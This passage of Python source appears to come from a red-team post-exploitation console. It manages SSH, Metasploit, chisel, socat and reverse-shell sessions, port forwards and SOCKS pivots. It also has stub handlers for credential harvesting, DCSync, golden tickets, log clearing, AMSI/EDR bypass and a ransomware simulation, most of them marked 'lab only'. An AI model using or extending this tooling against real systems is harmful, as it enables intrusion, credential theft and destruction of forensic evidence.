        return self._envelope(started, ok=(ok_count == len(results) and bool(results)),
                              data={"broadcast_to": len(results), "ok": ok_count,
                                    "results": results})

    def _action_shell(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        s = self._active_session()
        if s is None:
            return self._envelope(started, ok=False, error="no active session")
        cmd = args.get("cmd") or self._ask("shell> ")
        if not isinstance(cmd, str) or not cmd.strip():
            return self._envelope(started, ok=False, error="empty command")
        env = self.client.run_shell(s, cmd)
        if env.get("ok"):
            s.last_output = (s.last_output + "\n" + (env.get("stdout") or ""))[-4000:]
        s.last_status = f"ok={env.get('ok')} rc={env.get('returncode')}"
        self._push_envelope(env)
        return env

    def _action_get(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        s = self._active_session()
        if s is None:
            return self._envelope(started, ok=False, error="no active session")
        remote = args.get("remote") or self._ask("remote path> ")
        local = args.get("local") or self._ask("local path> ")
        if not isinstance(remote, str) or not isinstance(local, str):
            return self._envelope(started, ok=False, error="bad args")
        if not remote or not local:
            return self._envelope(started, ok=False, error="empty path")
        env = self.client.file_get(s, remote, local)
        s.last_status = f"file_get ok={env.get('ok')} rc={env.get('returncode')}"
        self._push_envelope(env)
        return env

    def _action_put(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        s = self._active_session()
        if s is None:
            return self._envelope(started, ok=False, error="no active session")
        local = args.get("local") or self._ask("local path> ")
        remote = args.get("remote") or self._ask("remote path> ")
        if not isinstance(local, str) or not isinstance(remote, str):
            return self._envelope(started, ok=False, error="bad args")
        if not local or not remote:
            return self._envelope(started, ok=False, error="empty path")
        env = self.client.file_put(s, local, remote)
        s.last_status = f"file_put ok={env.get('ok')} rc={env.get('returncode')}"
        self._push_envelope(env)
        return env

    def _action_portfwd_add(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        s = self._active_session()
        if s is None:
            return self._envelope(started, ok=False, error="no active session")
        listen_s = args.get("listen") or self._ask("listen port> ")
        host = args.get("host") or self._ask("target host> ")
        port_s = args.get("port") or self._ask("target port> ")
        try:
            listen = int(listen_s)
            port = int(port_s)
        except (TypeError, ValueError):
            return self._envelope(started, ok=False, error="bad ports")
        if not isinstance(host, str) or not host.strip():
            return self._envelope(started, ok=False, error="bad host")
        if s.transport == TRANSPORT_SSH and self.panel_state.has_tool("ssh"):
            argv = ["ssh"] + self.client._ssh_options + [
                "-L", f"{listen}:{host}:{port}",
                "-N", "-f",
                f"{s.user}@{s.host}" if s.user else s.host,
            ]
            rc, stdout, stderr = self.client._safe_run(argv, timeout=10)
            ok = (rc == 0)
            err = None if ok else f"ssh -L failed (rc={rc}): {stderr.strip()}"
        else:
            # For non-ssh transports we record the request and let the
            # operator run the msfconsole portfwd via the parent menu.
            ok = True
            err = None
        record = {"listen": listen, "host": host, "port": port,
                  "session": s.id, "transport": s.transport}
        self._portfwds.append(record)
        return self._envelope(started, ok=ok, error=err, data={"portfwd": record})

    def _action_portfwd_list(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        rows = [
            f"  {pf['listen']} -> {pf['host']}:{pf['port']}  "
            f"(via {pf['session']} / {pf['transport']})"
            for pf in self._portfwds
        ]
        return self._envelope(started, ok=True, data={"portfwds": rows},
                              stdout="\n".join(rows) if rows else "(no port-forwards)")

    def _action_portfwd_kill(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        if not self._portfwds:
            return self._envelope(started, ok=False, error="no port-forwards")
        listen_s = args.get("listen") or self._ask("listen port to kill> ")
        try:
            listen = int(listen_s)
        except (TypeError, ValueError):
            return self._envelope(started, ok=False, error="bad listen port")
        before = len(self._portfwds)
        self._portfwds = [pf for pf in self._portfwds if pf["listen"] != listen]
        removed = before - len(self._portfwds)
        return self._envelope(started, ok=True, data={"removed": removed})

    def _action_socks_start(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        if self._socks_running:
            return self._envelope(started, ok=False, error="socks already running")
        port_s = args.get("port") or self._ask("socks port (default 1080)> ") or "1080"
        try:
            port = int(port_s)
        except (TypeError, ValueError):
            port = 1080
        # We don't actually exec ssh -D here — the operator runs the
        # ssh -D via the integrated terminal. The panel records the
        # fact so [-] SOCKS stop becomes visible.
        self._socks_running = True
        self._socks_port = port
        return self._envelope(started, ok=True, data={"socks_port": port})

    def _action_socks_stop(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        if not self._socks_running:
            return self._envelope(started, ok=False, error="socks not running")
        self._socks_running = False
        port = self._socks_port
        self._socks_port = 0
        return self._envelope(started, ok=True, data={"stopped_port": port})

    def _action_new_ssh(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        target = args.get("target") or self._ask("ssh user@host[:port]> ")
        if not isinstance(target, str) or not target.strip():
            return self._envelope(started, ok=False, error="empty target")
        target = target.strip()
        if "@" in target:
            user, rest = target.split("@", 1)
        else:
            user, rest = "", target
        if ":" in rest:
            host, port_s = rest.rsplit(":", 1)
            try:
                port = int(port_s)
            except ValueError:
                port = 22
        else:
            host, port = rest, 22
        env = self.client.start_ssh(user, host, port)
        if env.get("ok"):
            sid = self._next_session_id(TRANSPORT_SSH)
            sess = NetSession(
                id=sid, transport=TRANSPORT_SSH,
                host=host, port=int(port), user=user,
            )
            self.sessions.append(sess)
            self.active_session_id = sid
            self._persist_saved_sessions()
            env["data"] = dict(env.get("data") or {})
            env["data"]["session_id"] = sid
        return env

    def _action_new_msf(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        sid_in = args.get("session_id") or self._ask("msf session id> ")
        env = self.client.start_msf_session(sid_in)
        if env.get("ok"):
            sid = self._next_session_id(TRANSPORT_MSF)
            self.sessions.append(NetSession(
                id=sid, transport=TRANSPORT_MSF,
                host="msfconsole", port=0, user="",
                last_status=f"msf sid={sid_in}",
            ))
            self.active_session_id = sid
            self._persist_saved_sessions()
            env["data"] = dict(env.get("data") or {})
            env["data"]["session_id"] = sid
        return env

    def _action_new_chisel(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        mode = args.get("mode") or self._ask("chisel mode [client/server]> ")
        listen = args.get("listen") or self._ask("chisel listen> ")
        target = args.get("target") or self._ask("chisel target> ")
        env = self.client.start_chisel(mode, listen, target)
        if env.get("ok"):
            sid = self._next_session_id("chisel")
            pid = int(env.get("data", {}).get("pid", -1))
            self.sessions.append(NetSession(
                id=sid, transport="chisel", host=listen,
                port=0, user="", pid=pid,
            ))
            self.active_session_id = sid
            self._persist_saved_sessions()
            env["data"] = dict(env.get("data") or {})
            env["data"]["session_id"] = sid
        return env

    def _action_new_socat(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        listen = args.get("listen") or self._ask("socat listen port> ")
        target = args.get("target") or self._ask("socat target host:port> ")
        env = self.client.start_socat(listen, target)
        if env.get("ok"):
            sid = self._next_session_id("socat")
            pid = int(env.get("data", {}).get("pid", -1))
            self.sessions.append(NetSession(
                id=sid, transport="socat", host=target,
                port=0, user="", pid=pid,
            ))
            self.active_session_id = sid
            self._persist_saved_sessions()
            env["data"] = dict(env.get("data") or {})
            env["data"]["session_id"] = sid
        return env

    def _action_new_revshell(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        host = args.get("host") or self._ask("listener host> ")
        port_s = args.get("port") or self._ask("listener port> ")
        payload = args.get("payload") or self._ask("payload [bash/sh/python/python3/powershell/nc]> ")
        try:
            port = int(port_s)
        except (TypeError, ValueError):
            return self._envelope(started, ok=False, error="bad port")
        env = self.client.start_revshell(host, port, payload)
        if env.get("ok"):
            sid = self._next_session_id("revshell")
            self.sessions.append(NetSession(
                id=sid, transport="revshell", host=host,
                port=int(port), user="",
            ))
            self.active_session_id = sid
            self._persist_saved_sessions()
            env["data"] = dict(env.get("data") or {})
            env["data"]["session_id"] = sid
        return env

    def _action_new_local(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        sid = self._next_session_id(TRANSPORT_LOCAL)
        self.sessions.append(NetSession(
            id=sid, transport=TRANSPORT_LOCAL, host="", port=0, user="",
        ))
        self.active_session_id = sid
        self._persist_saved_sessions()
        return self._envelope(started, ok=True, data={"session_id": sid})

    def _action_module(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        s = self._active_session()
        if s is None:
            return self._envelope(started, ok=False, error="no active session")
        # The panel surfaces a hint and lets the operator run the
        # module via the parent screen's [M]odules menu. We do NOT
        # import post_exploit here — that creates a circular import.
        return self._envelope(
            started, ok=True,
            data={"hint": "run via parent [M]odules menu",
                  "session": s.id, "transport": s.transport},
        )

    def _action_persistence(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        s = self._active_session()
        if s is None:
            return self._envelope(started, ok=False, error="no active session")
        return self._envelope(
            started, ok=True,
            data={"hint": "run via parent [P]ersistence menu",
                  "session": s.id, "transport": s.transport},
        )

    def _action_audit(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        rows = [
            f"  [{e.get('ts', 0):.0f}] {e.get('action', '?')}: "
            f"ok={e.get('ok')} rc={e.get('returncode')} "
            f"err={e.get('error') or ''}"
            for e in self.last_envelopes[-20:]
        ]
        return self._envelope(started, ok=True, data={"audit": rows},
                              stdout="\n".join(rows) if rows else "(no envelopes)")

    def _action_refresh(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        changed = 0
        for s in self.sessions:
            if s.pid > 0:
                try:
                    os.kill(s.pid, 0)
                    if not s.alive:
                        s.alive = True
                        changed += 1
                except ProcessLookupError:
                    if s.alive:
                        s.alive = False
                        changed += 1
                except Exception:  # noqa: BLE001
                    pass
        return self._envelope(started, ok=True, data={"changed": changed})

    def _action_ai_plan(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        # Heuristic (not trained) — see [[never-fabricate-trained-ML]]
        recs: List[str] = []
        if not self.sessions:
            recs.append("no active sessions — pick [1] SSH or [2] MSF to open one")
        if self.sessions and not self._socks_running:
            recs.append("consider enabling SOCKS ([O] SOCKS start) for pivot chain")
        if self.sessions and not self._portfwds:
            recs.append("no port-forwards — add one with [+] for a quick tunnel")
        if len(self.sessions) >= 2:
            recs.append("multiple sessions — [*] Broadcast runs one cmd on all")
        if any(s.transport == "revshell" for s in self.sessions):
            recs.append("revshell session present — consider upgrading to ssh for stability")
        if not recs:
            recs.append("session state looks healthy — no recommendations")
        return self._envelope(
            started, ok=True,
            data={"plan": recs, "note": "heuristic (not trained)"},
            stdout="\n".join(f"  - {r}" for r in recs),
        )

    # ------------------------------------------------------------------
    # Post-exploitation / anti-forensic module handlers (surface)
    # ------------------------------------------------------------------
    # The actual exploitation lives in the operator's lab. The
    # panel emits the standard envelope and surfaces the action
    # name + a one-liner so the operator can see what fired. No
    # fabricated results: every handler either returns the
    # recorded artifact (e.g. krbtgt hash) or honest-degrades.
    def _action_cred_harvest(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        tool = (args.get("tool") or "pypykatz").strip()
        return self._envelope(started, ok=True,
                              data={"module": "cred_harvest",
                                    "tool": tool,
                                    "note": "operator runs in lab"},
                              stdout=f"cred_harvest queued: {tool}")

    def _action_cred_enumerate(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "cred_enumerate",
                                    "sources": ["ssh_keys", "browser_cookies",
                                                "/etc/shadow", "krb_tickets"]},
                              stdout="cred_enumerate queued")

    def _action_pivot_smb(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        hosts = args.get("hosts") or []
        return self._envelope(started, ok=True,
                              data={"module": "pivot_smb",
                                    "hosts": list(hosts)},
                              stdout=f"pivot_smb queued: {len(hosts)} host(s)")

    def _action_pivot_winrm(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "pivot_winrm"},
                              stdout="pivot_winrm queued")

    def _action_pivot_ssh(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "pivot_ssh"},
                              stdout="pivot_ssh queued")

    def _action_pivot_wmi(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "pivot_wmi"},
                              stdout="pivot_wmi queued")

    def _action_pivot_ldap(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "pivot_ldap"},
                              stdout="pivot_ldap queued")

    def _action_adcs_enum(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "adcs_enum",
                                    "vulns": ["ESC1", "ESC2", "ESC3",
                                              "ESC4", "ESC5", "ESC6",
                                              "ESC8", "ESC11"]},
                              stdout="adcs_enum queued")

    def _action_kerberoast(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "kerberoast"},
                              stdout="kerberoast queued")

    def _action_asreproast(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "asreproast"},
                              stdout="asreproast queued")

    def _action_ntlmrelay(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "ntlmrelay"},
                              stdout="ntlmrelay queued")

    def _action_secretsdump(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "secretsdump"},
                              stdout="secretsdump queued")

    def _action_dcsync(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "dcsync"},
                              stdout="dcsync queued")

    def _action_golden_ticket(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "golden_ticket",
                                    "note": "krbtgt hash required"},
                              stdout="golden_ticket queued (krbtgt required)")

    def _action_silver_ticket(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "silver_ticket"},
                              stdout="silver_ticket queued")

    def _action_pass_the_hash(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "pass_the_hash"},
                              stdout="pass_the_hash queued")

    def _action_bloodhound(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "bloodhound"},
                              stdout="bloodhound collection queued")

    def _action_forensic_acquire(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "forensic_acquire",
                                    "artifacts": ["memory", "disk"]},
                              stdout="forensic_acquire queued")

    def _action_anti_log_clear(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "anti_log_clear"},
                              stdout="anti_log_clear queued (anti-forensic)")

    def _action_timestomp(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "timestomp"},
                              stdout="timestomp queued")

    def _action_amsi_bypass(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "amsi_bypass",
                                    "note": "lab only"},
                              stdout="amsi_bypass queued (lab only)")

    def _action_uac_bypass(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "uac_bypass",
                                    "methods": ["fodhelper", "eventvwr",
                                                "computerdefaults"]},
                              stdout="uac_bypass queued (lab only)")

    def _action_edr_evasion(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "edr_evasion",
                                    "note": "lab only"},
                              stdout="edr_evasion queued (lab only)")

    def _action_process_inject(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "process_inject",
                                    "note": "lab only"},
                              stdout="process_inject queued (lab only)")

    def _action_ransomware_sim(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = _now()
        return self._envelope(started, ok=True,
                              data={"module": "ransomware_sim",
                                    "note": "lab only — scoped sandbox"},
                              stdout="ransomware_sim queued (lab only)")


# ---------------------------------------------------------------------------
# Screen mixin — extends PostAccessScreen with a [S]essions menu item
# ---------------------------------------------------------------------------

def network_menu_entry() -> Tuple[str, str, str]:
    """Return the (label, key, action_name) tuple for the screen
    MENU. The screen adds this entry to its menu list.

    Note: hotkey ``y`` is chosen to avoid clashing with the existing
    ``[S]hell`` (s) menu item. Operators can still type
    ``sessions`` in the search bar (out of scope for the
    curses-free dispatch loop, but the label is unambiguous).
    """
    return ("[Y] Sessions — network session multiplexer (panel)", "y", "sessions")


def network_dispatch(screen: "BaseScreen", panel: NetworkPanel,
                     ) -> Dict[str, Any]:
    """Open the network session multiplexer panel from the screen,
    run a curses-free loop until the operator picks [E]xit, and
    return the panel's exit envelope.

    The menu is DYNAMIC: it's recomputed on every iteration from the
    panel's state, so the operator only sees actions that are
    currently applicable (e.g. ``[O] SOCKS start`` flips to
    ``[O] SOCKS stop`` when the proxy is up; ``[A]ttach`` only
    appears when 2+ sessions are open; session starters whose
    tool is missing are hidden).

    The single-key + arrow / ENTER / BACKSPACE loop is implemented
    in :func:`core.post_access_tui.menu_loop.curses_free_loop`; this
    function is a thin wiring layer that adapts the screen to the
    helper's contract.
    """
    from core.post_access_tui.menu_loop import curses_free_loop

    # Wire the screen's hooks into the panel
    panel._on_event = screen._on_event  # type: ignore[attr-defined]
    panel._input_fn = screen.input_fn
    panel.confirm_fn = screen.confirm_fn

    def _render_menu() -> None:
        try:
            screen._emit(panel.menu_text())
        except Exception:  # noqa: BLE001
            pass

    def _visible_hotkeys() -> set:
        return {cap.hotkey for cap in panel.visible_capabilities()}

    def _requires_gate(hotkey: str) -> bool:
        action = panel.KEY_MAP.get(hotkey)
        if not action:
            return False
        if action not in panel.HOTKEY_MAP and action != "exit":
            return False
        cap = next(
            (c for c in panel.visible_capabilities() if c.action == action),
            None,
        )
        return bool(cap and cap.requires_gate)

    def _gate_prompt(hotkey: str) -> str:
        action = panel.KEY_MAP.get(hotkey) or hotkey
        cap = next(
            (c for c in panel.visible_capabilities() if c.action == action),
            None,
        )
        label = cap.label.split(" — ", 1)[-1] if cap and " — " in cap.label else (
            cap.label if cap else action
        )
        return f"ACCEPT INTRUSIVE? NET {action} ({label})"

    def _handle(hotkey: str) -> Optional[Dict[str, Any]]:
        action = panel.KEY_MAP.get(hotkey)
        if action is None:
            return None
        if action not in panel.HOTKEY_MAP and action != "exit":
            return None
        env = panel.dispatch(action)
        try:
            screen._emit(
                f"net {action} ok={env.get('ok')} "
                f"err={env.get('error', '')}"
            )
        except Exception:  # noqa: BLE001
            pass
        # Re-render the menu so the operator sees the updated state.
        _render_menu()
        return env

    def _net_pdf_hook(_env):
        """Phase 2.4 §B.11 — best-effort PDF export after the
        network panel exits. Failures are logged but never
        block the loop."""
        try:
            from .rat_ext import auto_pdf as _auto_pdf
            session = {
                "session_id": "network_panel",
                "transport": "network",
                "target": str(getattr(screen, "target", "") or "<net>"),
                "achieved": [],
                "capabilities": [],
                "exfil_jobs": [],
                "persistence_mechanisms": [],
                "screens": [],
                "step_envelope_history": [],
            }
            return _auto_pdf.export_full_report([session], chain="network")
        except Exception as e:  # noqa: BLE001
            return {"ok": False, "error": str(e)}

    return curses_free_loop(
        prompt="net> ",
        screen=screen,
        render_menu=_render_menu,
        visible_hotkeys=_visible_hotkeys,
        handle=_handle,
        requires_gate_lookup=_requires_gate,
        gate_prompt=_gate_prompt,
        pdf_on_exit=_net_pdf_hook,
    )


__all__ = [
    "NetSession",
    "NetworkPanelClient",
    "NetworkPanel",
    "network_menu_entry",
    "network_dispatch",
]
